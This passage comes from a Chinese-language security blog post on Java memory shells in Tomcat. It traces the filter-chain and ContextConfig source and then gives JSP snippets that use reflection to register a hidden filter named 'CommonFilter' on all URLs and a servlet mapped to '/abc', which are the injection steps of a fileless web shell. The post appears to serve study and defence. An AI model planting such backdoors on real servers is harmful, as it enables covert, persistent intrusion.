+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"> <span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> ApplicationFilterConfig[<span class="number">0</span>];</span><br><span class="line">...</span><br><span class="line"> ApplicationFilterConfig(Context context, FilterDef filterDef) </span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">internalDoFilter</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="params"><span class="function">                                  ServletResponse response)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123; </span><br><span class="line">    <span class="comment">// 检查是否还有下一个过滤器需要执行</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    <span class="comment">// 获取当前位置的过滤器</span></span><br><span class="line">            ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Filter filter = filterConfig.getFilter();<span class="comment">//通过ApplicationFilterConfig获得Filter</span></span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;<span class="comment">//是否存在 SecurityManager</span></span><br><span class="line">                    <span class="keyword">final</span> ServletRequest req = request;</span><br><span class="line">                    <span class="keyword">final</span> ServletResponse res = response;</span><br><span class="line">                    Principal principal =</span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"> </span><br><span class="line">                    Object[] args = <span class="keyword">new</span> Object[]&#123;req, res, <span class="keyword">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="comment">// 调用过滤器的 doFilter 方法进行处理</span></span><br><span class="line">                    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们来寻找一下 ApplicationFilterChain.filters 属性在哪里被赋值。</p>
+<p>在StandardWrapperValve#invoke()方法中，通过ApplicationFilterFactory.createFilterChain()方法初始化了一个ApplicationFilterChain类,看看这个ApplicationFilterChain.filters 属性是如何生成的</p>
+<h5 id="ApplicationFilterFactory"><a href="#ApplicationFilterFactory" class="headerlink" title="ApplicationFilterFactory"></a>ApplicationFilterFactory</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="params"><span class="function">            Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        filterChain = <span class="keyword">new</span> ApplicationFilterChain();</span><br><span class="line"> </span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 通过wrapper.getParent()函数来获取StandardContext对象</span></span><br><span class="line">        StandardContext context = (StandardContext) wrapper.getParent();</span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        String servletName = wrapper.getName();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取StandardContext中的FilterMaps对象，FilterMaps对象中存储的是各Filter的名称路径等信息</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            </span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//最后根据Filter的名称，在StandardContext中获取FilterConfig</span></span><br><span class="line">            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">//将filterConfig添加到filterChain中</span></span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Return the completed filter chain</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Prevent the same filter being added multiple times</span></span><br><span class="line">        <span class="keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(filter==filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                <span class="keyword">new</span> ApplicationFilterConfig[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">            filters = newFilters;<span class="comment">//添加到filters属性中</span></span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//FilterDef</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Filter filter = <span class="keyword">null</span>;</span><br><span class="line"> <span class="keyword">private</span> String filterClass = <span class="keyword">null</span>;<span class="comment">// &lt;filter-class&gt;&lt;/filter-class&gt;</span></span><br><span class="line">    <span class="keyword">private</span> String filterName = <span class="keyword">null</span>;<span class="comment">//&lt;filter-name&gt;&lt;/filter-name&gt;</span></span><br><span class="line"><span class="comment">//FilterMap</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> dispatcherMapping = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">private</span> String[] servletNames = <span class="keyword">new</span> String[<span class="number">0</span>];<span class="comment">// &lt;filter-name&gt;TestFilter&lt;/filter-name&gt;</span></span><br><span class="line">    <span class="keyword">private</span> String[] urlPatterns = <span class="keyword">new</span> String[<span class="number">0</span>];<span class="comment">// &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span></span><br><span class="line">    <span class="keyword">private</span> String filterName = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+<p>简单来说就是根据从<strong>StandardContext的FilterMaps</strong>中获取的<strong>filterName</strong>在<strong>StandardContext的filterConfigs</strong>选出<strong>与之匹配的键</strong>的<strong>值(ApplicationFilterConfig)<strong>，并将其添加到</strong>filterChain的filters</strong>中,这个<strong>filterChain(ApplicationFilterChain)<strong>最后会触发</strong>internalDoFilter</strong>方法</p>
+<h5 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取StandardContext对象</span></span><br><span class="line">    ServletContext servletContext = request.getSession().getServletContext();<span class="comment">//获取ApplicationContextFacade类 </span></span><br><span class="line">    Field appContextField = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line">    appContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    Field standardContextField = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line">    standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//FilterDef封装filter并添加进standardContext</span></span><br><span class="line">    Shell_Filter filter = <span class="keyword">new</span> Shell_Filter();</span><br><span class="line">    String name = <span class="string">&quot;CommonFilter&quot;</span>;</span><br><span class="line">    FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//创建filterMap并添加进standardContext</span></span><br><span class="line">    FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(name);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"> </span><br><span class="line"> <span class="comment">//使用ApplicationFilterConfig封装filterDef，然后将其添加到standardContext的filterConfigs中</span></span><br><span class="line">    Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"> </span><br><span class="line">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name, filterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h4><p>上面我们已经分析了StandardContext是通过Wrapper容器加载Servlet,接下来我们具体分析一下如何构造Wrapper</p>
+<h5 id="ContextConfig"><a href="#ContextConfig" class="headerlink" title="ContextConfig"></a>ContextConfig</h5><p>ContextConfig 类是 Tomcat 的内部类，它实现了 Tomcat 的 LifecycleListener 接口，用于监听 Web 应用程序上下文的生命周期事件。具体而言，ContextConfig 类在应用程序启动时负责读取和解析应用程序的 web.xml 配置文件，并将配置信息应用到应用程序的上下文中。ContextConfig 类会创建和初始化 Servlet 上下文对象，用于管理应用程序的 Servlet。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ContextConfig</span> <span class="keyword">implements</span> <span class="title">LifecycleListener</span> </span>&#123;</span><br><span class="line">....</span><br><span class="line">     <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">configureContext</span><span class="params">(WebXml webxml)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        context.setPublicId(webxml.getPublicId());</span><br><span class="line"> </span><br><span class="line">...   <span class="comment">//设置StandardContext参数</span></span><br><span class="line"> </span><br><span class="line">        </span><br><span class="line">       <span class="keyword">while</span>(var35.hasNext()) &#123;</span><br><span class="line">            ServletDef servlet = (ServletDef)var35.next();</span><br><span class="line">             <span class="comment">//创建StandardWrapper对象</span></span><br><span class="line">            Wrapper wrapper = <span class="keyword">this</span>.context.createWrapper();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (servlet.getLoadOnStartup() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//设置LoadOnStartup属性</span></span><br><span class="line">                 wrapper.setLoadOnStartup(servlet.getLoadOnStartup());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (servlet.getEnabled() != <span class="keyword">null</span>) &#123;</span><br><span class="line">                wrapper.setEnabled(servlet.getEnabled().booleanValue());</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletName属性</span></span><br><span class="line">            wrapper.setName(servlet.getServletName());</span><br><span class="line">            Map&lt;String, String&gt; params = servlet.getParameterMap();</span><br><span class="line">            var7 = params.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">                Map.Entry&lt;String, String&gt; entry = (Map.Entry)var7.next();</span><br><span class="line">                wrapper.addInitParameter((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">.......</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//设置ServletClass属性</span></span><br><span class="line">            wrapper.setServletClass(servlet.getServletClass());</span><br><span class="line">            ...</span><br><span class="line">            wrapper.setOverridable(servlet.isOverridable());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//将包装好的StandWrapper添加进ContainerBase的children属性中</span></span><br><span class="line">            context.addChild(wrapper);</span><br><span class="line"> </span><br><span class="line">             var35 = webxml.getServletMappings().entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var35.hasNext()) &#123;</span><br><span class="line">            Map.Entry&lt;String, String&gt; entry = (Map.Entry)var35.next();</span><br><span class="line">            <span class="keyword">this</span>.context.addServletMappingDecoded((String)entry.getKey(), (String)entry.getValue()); <span class="comment">//添加路径映射</span></span><br><span class="line">        &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h5 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext stdcontext = (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    Wrapper newWrapper = stdcontext.createWrapper();</span><br><span class="line">    String name = servlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/abc&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h3>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/10/15/java/java%20jndi/" rel="prev" title="java jndi">
+                  <i class="fa fa-chevron-left"></i> java jndi
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/11/13/java/java%20tostring-getter%E9%93%BE/" rel="next" title="java tostring-getter链">
+                  java tostring-getter链 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
